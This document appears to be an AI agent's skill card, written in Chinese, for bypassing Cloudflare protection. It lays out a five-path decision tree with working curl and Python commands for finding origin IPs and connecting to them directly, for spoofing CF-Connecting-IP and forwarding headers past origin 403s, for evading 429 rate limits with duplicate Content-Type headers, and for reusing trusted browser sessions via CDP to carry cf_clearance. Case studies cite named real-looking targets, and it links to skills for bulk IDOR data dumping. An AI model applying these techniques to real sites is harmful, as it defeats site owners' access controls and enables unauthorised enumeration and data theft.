---
name: cloudflare-bypass
description: >-
  Cloudflare 应对与绕过总技（决策树五路径）。目标挂 CF 时：先判打的是哪一层，再从
  5 条路径选一条：A.找源站直连 / B.伪造CF头绕源站403 / C.边缘绕过破429+OpenAPI /
  D.CDP复用已信任会话 / E.判死收手。含9个血泪坑、6实战案例、判死6条件。
  触发词：Cloudflare绕过、CF挡住、源站403、cf_clearance、Just a moment、
  CF-Connecting-IP、重复Content-Type、429限流CF、cf-ray、CDN绕过总入口。
  溯源50法走 cdn-origin-tracing；阿里云/腾讯盾JS质询走 waf-js-challenge-bypass。
---

# Cloudflare 应对与绕过 · 测绘引擎专卡

> 一句话：目标挂 CF → 先判**打的是哪一层** → 从 5 条路径选一条 → 找不到源站且无缝隙 = 诚实收手转数据面。

## 真源

- 本文件（含完整命令与实战案例）
- 源站溯源50法：Skill `cdn-origin-tracing` · `python3 tools/ops/cdn_tracer.py <domain>`
- CDN IP 过滤：`python3 tools/ops/cdn_ranges.py <ip>` 或 `tools/stress-bot/cdn_ranges.py`
- 代理池轮换拖库：Skill `cf-rate-limit-evasion-bulk-dump`
- CDP 驱动浏览器：Skill `browser-cdp-pentest`（`waf-js-challenge-bypass` 处理阿里云/腾讯盾）

---

## 0. 30 秒决策树

```
目标挂 CF？
 → nslookup target + curl -sI ... | grep cf-ray
 ↓
 A. 找源站 IP → 直连          ← 永远先做，成功率最高
    ├─ 成功 → --resolve 直连，后续枚举走源站
    ├─ 找到但 403 → 走 B
    └─ 找不到 → 查"缝隙六条"，全灭 → E
 B. 伪造 CF 头                 ← 源站只查头存在不验真
 C. 边缘绕过（无源站时）       ← 双 CT 破 429 / OpenAPI 快打
 D. CDP 复用已信任会话         ← Just a moment / 567 / cf_clearance
 E. 判死收手                   ← 六条全中才收
```

---

## 1. 分层识别

```bash
nslookup target.com
curl -sI https://target.com/ | grep -iE "server|cf-ray|cf-cache-status|retry-after"
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/api/任意路径
```

| 层 | 特征 | 路径 |
|----|------|------|
| L1 边缘/网络 | Anycast IP + `Server: cloudflare` + CF-RAY | A（无法"绕过边缘"，只能找源站）|
| L2 WAF 路径级 | `/api/*` 全 403，静态资源 200 | A 直连；无源站 → 变形 payload + 静态通道 |
| L3 Bot 管理 | `Just a moment`、`cf_clearance`、error 1010 | D 会话/指纹 |
| L4 Rate Limit | 429 / `Retry-After` | C 双 CT 头；或 A 直连 |
| L5 TLS/JA3 | curl 被拦，浏览器过 | D 真实浏览器 / curl_cffi |
| L6 无源站形态 | cloudflared Tunnel / Workers / Pages | A 无解 → 打应用层 |

---

## 2. 路径 A：源站 IP 发现 → 直连 ⭐（主力）

### 2.1 先查缝隙（决定投不投入）

```
1. 全部域名含基础设施域是否全挂 CF？→ 有一个不挂就是入口
2. 有邮件服务器？MX/SPF/DMARC 泄露发信 IP
3. 域名注册多久？新域从未裸奔 = 无历史 DNS
4. 证书通配符还是有 IP SAN？通配符 = 无证书反查入口
5. 子域爆破有非 CF 的？dev/test/staging/api/ws/admin
6. 有 SSRF 点？客服上传、URL 抓取、游戏 iframe
7. 框架 debug/异常页泄露 `SERVER_ADDR`？→ TP6 trace、Django DEBUG=True、Spring error page（712win3 实战：TP6 debug 异常页含 `SERVER_ADDR=172.31.43.223` → 反推 EC2 实例 → 公网 IP）
```
**六条全灭 = 纯外部侦察绕不过 → 直接跳 E**

### 2.2 13 法（按成功率）

| # | 技术 | 命令/工具 |
|---|------|---------|
| 1 | **内容搜索** ⭐ | Censys `host.services.endpoints.http.body:"<基础设施域名>"`；Shodan `http.html:"<品牌串>"`；FOFA `cert="<domain>"` |
| 2 | 历史 DNS | SecurityTrails / ViewDNS.info / RapidDNS / VirusTotal |
| 3 | 证书透明度 | `curl -s "https://crt.sh/?q=%25.<domain>&output=json"` + 证书反查 Censys |
| 4 | 未挂 CDN 子域 | 子域爆破 200+ 词 × 所有根域，过滤非 CF 段 |
| 5 | 邮件头/SPF/MX | `dig TXT <domain> \| grep spf`；注册邮件原文 IP |
| 6 | **JS 硬编码** | `grep -oE 'https?://[a-z0-9.-]+(:[0-9]+)?'`；`grep -oE "var ip = ['\"][0-9.]+"` |
| 7 | Git 历史泄露 | `git fetch --unshallow` 搜 VPS 主机名邮箱 → `dig A` |
| 8 | 反向 IP 兄弟域 | `api.hackertarget.com/reverseiplookup/?q=<IP>` |
| 9 | CNAME 链追踪 | `dig +short <sub> CNAME` 追到非 CDN 域 |
| 10 | IPv6 | `nslookup -type=AAAA <domain>`（AAAA 常直连，防护弱）|
| 11 | Favicon 哈希 | `mmh3` → Shodan `http.favicon.hash:` / FOFA `icon_hash=` |
| 12 | APK/客户端 | jadx/apktool 找硬编码 IP 与 API 域名 |
| 13 | 证书指纹反查 | 目标证书 SHA256 → Censys/Shodan 搜同证书 IP |

深度50法 → **Skill `cdn-origin-tracing`** · `python3 tools/ops/cdn_tracer.py <domain>`

### 2.3 三重验证（防误判）

```bash
# 1. 直连看指纹（--noproxy 防本机代理）
curl -s -m 10 -k --noproxy "*" -D - https://<IP>/ | head

# 2. --resolve 保 SNI（关键！）
curl -s -m 10 -k --resolve "target.com:443:<IP>" https://target.com/ | head

# 3. 批量验证候选
python3 -c "
import concurrent.futures, http.client, ssl
ctx = ssl._create_unverified_context()
def probe(ip):
    try:
        c = http.client.HTTPSConnection(ip, 443, timeout=8, context=ctx)
        c.request('GET', '/', headers={'Host': 'target.com'})
        r = c.getresponse(); b = r.read(2000).decode('utf-8','replace')
        return ip, r.status, r.getheader('Server'), r.getheader('CF-RAY'), len(b)
    except Exception as e: return ip, 'ERR', str(e)[:40], '', ''
ips = [l.strip() for l in open('candidates.txt')]
with concurrent.futures.ThreadPoolExecutor(20) as ex:
    for row in ex.map(probe, ips): print(row)
"
```

| 响应 | 判断 |
|------|------|
| 目标页面 + `Server: nginx/x.y.z` + **无 CF-RAY** | ✅ 真源站 |
| `Server: cloudflare` + CF-RAY | ❌ CF 边缘/回源节点 |
| 无 Host 返回默认页，带 Host 返回 301/空 | ⚠️ 换 Host 再试 |

CDN IP 过滤：`python3 tools/ops/cdn_ranges.py --filter $(cat candidates.txt)`

### 2.4 直连手法

```bash
# HTTPS：--resolve 等价改 hosts，免改系统
curl -sk --resolve "target.com:443:<IP>" https://target.com/api/xxx

# vhost 无独立 DNS：裸 IP + Host 头
python3 -c "
import http.client, ssl, json
c = http.client.HTTPSConnection('<IP>', 443, timeout=15,
    context=ssl._create_unverified_context())
c.request('POST', '/api/hall/setting', body=json.dumps({}),
    headers={'Host':'game-service.target.com','Content-Type':'application/json'})
print(c.getresponse().status)"
```

### 2.5 必须改走源站的 4 个时机

1. **批量越权/枚举**：源站没有 CDN 限流，经 CDN 几十个请求后被限速打断
2. CF 前端裁剪了响应字段（实测 92B vs 2207B）
3. 需确认路由是"真 404"还是"被 CF 挡"
4. 需要看框架报错/堆栈

---

## 3. 路径 B：伪造 CF 头（源站头校验绕过）

**场景**：找到源站但直连 403，源站只对"来自 CDN 的请求"放行。

```python
import requests

headers = {
    "Host":              "target.com",
    "CF-Connecting-IP":  "104.21.85.110",   # 任意 CF 边缘 IP
    "X-Forwarded-For":   "104.21.85.110",
    "X-Real-IP":         "104.21.85.110",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin":  "https://target.com",
    "Referer": "https://target.com/",
    "Content-Type": "application/json",
}
r = requests.post("https://<origin_ip>/api/session-check",
                  headers=headers, json={}, verify=False)
print(r.status_code, r.text[:300])
```

- **成功信号**：403 → 200
- ⚠️ 三个 IP 头要一起带（不同后端读不同头）
- ⚠️ 此法只在**直连源站时**有效；在 CF 边缘伪造 IP 头会被直接拦（error 1000）
- **白捡情报**：错误/空缺 Host 头时，有时会列出同服务器所有品牌域名

---

## 4. 路径 C：无源站时的边缘绕过

### 4.1 重复 Content-Type 头破 CF 429 ⭐

**原理**：CF 限流规则精确匹配 `Content-Type: application/json`，而后端（FastAPI）会读第一个 Content-Type。发两个 Content-Type 头：

```bash
curl -s -X POST "https://target/api/auth/register" \
  -H "Content-Type: application/json" \
  -H "Content-Type: text/plain" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"name":"T","email":"<EMAIL-REDACTED>","password":"Pass1234!","turnstile_token":""}'
# 429 → 200 或 422 → 只要不再是 429 就算破
```

**变体测试矩阵**（实测有效的只有一种）：

| 变体 | 结果 |
|------|------|
| `application/json` + `text/plain`（双头）| ✅ **唯一有效** |
| `application/json; charset=utf-8` | ❌ 仍 429 |
| `Application/JSON`（大写）| ❌ 仍 429 |
| `text/plain` 单发 | ❌ 后端 422 |
| 伪造 `X-Forwarded-For` | ❌ CF 直拦 error 1000 |

⚠️ 适合**单发关键请求**（注册拿 token 一次），不适合批量。批量必须走源站（路径 A）。

### 4.2 路径级 WAF — 已实测无效，别踩

```
路径编码:   /api%2f  //api  /API/  尾随斜杠  .json 后缀  %00
请求头注入: X-Forwarded-Host  X-Original-URL  X-Rewrite-URL
协议切换:   WebSocket 握手  HTTP/1.0
浏览器过质询后自己 fetch: 前端也 403
代理池:     多数被拦
```

### 4.3 FastAPI Swagger/OpenAPI 快打

```bash
# 找 openapi.json（CF 后端常是 FastAPI）
for p in /docs /openapi.json /redoc /cloud/docs /cloud/openapi.json /api/docs; do
  echo "== $p"; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "https://target$p"
done

# 拿到后一次解析全部端点
python3 -c "
import json; s = json.load(open('openapi.json'))
[print(m.upper(), p, info.get('summary','')) for p, ms in s['paths'].items()
 for m, info in ms.items() if m in ('get','post','put','delete')]"
```

**常见高价值未文档化端点**：`/api/webhook/gumroad`、`/api/pay/crypto`、`/api/admin/config`、`/api/admin/logs`、`/api/verify`（license 验证常不限速）

---

## 5. 路径 D：质询 / 指纹绕过

| 现象 | 类型 | 方法 |
|------|------|------|
| `Just a moment` + `cf_clearance` | JS Challenge | 有头浏览器等 8-12s 常可过 |
| Turnstile 交互框 | Turnstile | 人工点或 CDP 等待 |
| error 1010 | 浏览器完整性 | 修指纹或复用会话 |
| error 1020 / 567 | 边缘访问规则 | 换出口/换指纹/复用会话 |
| curl 被拦，浏览器过 | TLS JA3/JA4 | curl_cffi 或真实浏览器 |

### 5.1 ⭐ 最省力：复用已信任会话

CF 信任**绑定在浏览器指纹 + 出口 IP 的组合**上。同一 Chrome 实例访问过同族 CDN 站点后，指纹已被信任。

```bash
# 启有头 Chrome + CDP（--remote-allow-origins=* 必须加！）
google-chrome --remote-debugging-port=9223 --remote-allow-origins="*" \
              --user-data-dir="/tmp/chrome_pentest"
# headless 会被检测 → 必须有头模式
```

然后通过 CDP 在页面内执行 fetch，自动携带 `cf_clearance` + 全部 cookie + 正确指纹 + 正确 TLS 栈。

详细 CDP 驱动 → Skill `browser-cdp-pentest`

### 5.2 把 cf_clearance 搬到 curl

```python
# CDP 取 cookie 和 UA
cookies = cdp.Network.getAllCookies()   # 找 name == 'cf_clearance'
ua = cdp.Runtime.evaluate("navigator.userAgent")
# curl 要求：同出口 IP + 同 UA + 带 cookie，三者缺一即失效
```

⚠️ token 按 CDN 通道隔离：CF 通道的 token 在 EdgeOne 通道无效。

---

## 6. 路径 E：判死条件

**以下 6 条全中 = 纯外部侦察绕不过，停止无效尝试**：

```
✗ 全部域名（含基础设施）全挂 CF
✗ 无邮件服务器（MX/SPF/DMARC 全无）
✗ 域名新注册，从未裸奔（无历史 DNS）
✗ 证书只有 *.domain 通配符（无 IP SAN）
✗ 子域爆破全 CF（230+ 词无遗漏）
✗ 无 SSRF 点（客服上传/URL 抓取/游戏 iframe 全无）
```

**正确收手动作**：
1. 把**公网可达业务面**打透（WS 协议 / REST / 客服 API）
2. 整理：`{版本号, 全部 API 端点, WAF 层级判定, 节点 IP + 面板, 已排除的绕过手法}`
3. 报告标注「⚠️ 实际利用被 CF WAF 拦截」
4. 部署状态哨兵：轮询域名 A 记录/HTTP 状态码（域名轮换、解封即唤醒复工，如 drfm-sentinel 每 3h）。**哨兵输出必须抗抖动**（否则 000↔wall 单发抖动反复假唤醒、烧 agent 轮次）— 三件套：①输出净化：dig/curl 报错文本会污染输出字段（dig 只收合法 IPv4 行）；②跨路径回退：主通道（SOCKS）全败自动改走跳板裸测；③稳态平滑：状态变化需延时 15s 二次确认、两次同向才切换（drfm_watch.sh v4.1 实装，2026-10）

---

## 7. 9 个血泪坑

1. **TUN 假象** ⭐：sing-box/v2rayN TUN 开时任意端口都显示 OPEN。**curl 的真实 HTTP 响应才可信**。测端口前先关 TUN。
2. **curl `https://IP/` 不写 `--resolve`**：SNI 不匹配 → SSL EOF → 误判"源站不通"。
3. **AWS IP ≠ 非 CF**：CF 边缘也跑在 AWS。判据 = **无 CF-RAY + 指纹匹配**，不是 IP 归属。
4. **证书签发方骗局**：用 Let's Encrypt 不代表没挂 CF。判 CF 只看解析 IP 段。
5. **Host 不匹配静默落 default vhost**：写错 Host 不报错，返回别的站内容 → 极易误判"路由不存在"。先用已知 Host 取基线再对比。
6. **内容搜索词要唯一**：用通用词烧掉 Censys 5 次/天额度。用基础设施域名/品牌串。
7. **找到源站后保持频率纪律**：直连只是换入口，不是新目标。
8. **验证漏洞 ≠ 实际利用**：代码审计确认的洞若被 WAF 拦，报告必须标注。
9. **大厂翻译代理 ≠ 住宅出口**：Google translate.goog / Yandex turbopages / 百度 transpage / 微软 translatetheweb 都从数据中心抓取——遇「机房级全封」目标（drfmud7h5b2n 实测）同样 403，别当绕过路径浪费轮次。

---

## 8. 实战案例

| 案例 | 结论 |
|------|------|
| m9600/MM99 博彩 | 13 法全败 → **Censys 内容搜索**破局，51 源站 IP（AWS 巴西）；管理端不在公网 HTTP 层 |
| 9v111/game-service | 直连 vs 经 CF：**92B → 2207B**；批量枚举必走源站 |
| pkrslots57 | EdgeOne 567 → **CDP 复用已信任会话**页面内 fetch 全通 |
| deepalphabot | CF 429 → **重复 Content-Type**破（200/422）；FastAPI OpenAPI 快打 |
| vortexprotocols | 源站 403 → **伪造 CF-Connecting-IP + XFF + X-Real-IP** → 200；错误 Host 泄露 5 个品牌 |
| ji-wei.com Xboard | 路径级 WAF：过质询后前端自己也 403；**静态资源是唯一稳定通道** |
| drfmud7h5b2n/绸固发展(资金盘) | **机房级全域封锁**：自有三机房+CN阿里云+WARP+Google translate/Yandex turbopages 代理全 403 → 判定疑似只放住宅IP；无源站缝隙 → 部署哨兵等域名轮换 |

---

## 9. 工具速查

```bash
# CDN IP 过滤（引擎内置，51 厂商 744 段）
python3 tools/ops/cdn_ranges.py 104.21.85.110           # 单查
python3 tools/ops/cdn_ranges.py --filter $(cat ips.txt) # 批量

# 源站溯源流水线
python3 tools/ops/cdn_tracer.py target.com --out exports/.../recon/

# CF IP 段（快速肉眼排除）
# 104.16.0.0/12  172.64.0.0/13  173.245.48.0/20  162.158.0.0/15
# 188.114.96.0/20  190.93.240.0/20  198.41.128.0/17

# 引擎搜索语法
# Censys: host.services.endpoints.http.body:"<品牌串>"
# FOFA:   cert="<domain>"  / body="<串>"
# Shodan: http.html:"<串>" / ssl.cert.subject.cn:<domain>
```

## 关联专卡

| 专卡 | 用途 |
|------|------|
| `cdn-origin-tracing` | 源站溯源 50 法深度版（本卡 2.2 的上位替代） |
| `cf-rate-limit-evasion-bulk-dump` | 代理池轮换批量 IDOR 拖库 |
| `waf-js-challenge-bypass` | 阿里云/腾讯盾 JS 质询（非 CF） |
| `imunify360-direct-ip-bypass` | Imunify360 直连源站绕过 |
| `browser-cdp-pentest` | CDP 驱动真实浏览器（过质询/会话收割） |
| `waf-detector` | WAF 型号指纹识别 |


---

## 外部库增量（2026-10-11 分享包）

## When to Use (触发条件)

- DNS 解析到 CF 段(104.16-31.x / 172.64-71.x / 188.114.96-97.x / 173.245.x / 103.21-22.x / 141.101.x / 108.162.x / 190.93.x / 198.41.x / 162.158.x / 131.0.72.x / 131.0.100.x),响应头 `Server: cloudflare` + `CF-RAY`
- 页面 `Just a moment...` / Turnstile / error **1010**(浏览器完整性) / **1020**(访问被拒) / CF **429** 限流 / 特定路径 403(payload 被 WAF 拦)
- 关键词: CF 绕过、源站、真实 IP、cf_clearance、五秒盾


## 全文导航（已拆分）

主卡保留前 14 节；其余 6 节在 `references/full.md`：

- 1. 分层识别(30 秒,决定打哪条路径)
- 2. 决策树 — 五条路径
- 3. 验证(怎么算赢)
- 4. Pitfalls(血泪)
- 5. 家族地图
- References

加载：`skill_view(name='cloudflare-bypass', file_path='references/full.md')`
